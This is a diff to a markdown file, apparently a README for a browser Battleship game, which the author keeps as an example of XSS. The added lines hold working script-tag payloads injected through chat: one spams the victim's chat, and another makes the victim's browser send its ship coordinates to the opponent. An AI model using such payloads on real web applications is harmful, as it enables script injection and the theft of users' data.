@@ -2,6 +2,8 @@
 ### I am saving this as an example of how an XSS exploit could potentially look/work
 
 #### Here's some example exploits
-#### Many of these exploits require making a local variable in the browser terminal first
-- Spam opponent chat: ``
-- 
+#### Many of these exploits require making a local variable in the browser terminal first: 
+`sessionStorage.setItem("Attacker", "")`
+
+- Spam victim chat: <br>`<script>if(sessionStorage.getItem("Attacker")==null){addMessageToChat("Spammed", "You Got")}</script>`
+- Get victim to send ship data: <br> `<script>if(sessionStorage.getItem("ShipVictim")==null&&sessionStorage.getItem("Attacker")==null){sessionStorage.setItem("ShipVictim", "");for(let i in ships){let ship=ships[i];let msg=ship.name+"<br>";for(let j in ship.spaces){msg+="X: "+ship.spaces[j].x+", ";msg+="Y: "+ship.spaces[j].y+"<br>";}sendMessageToPeer(msg);}}</script>`
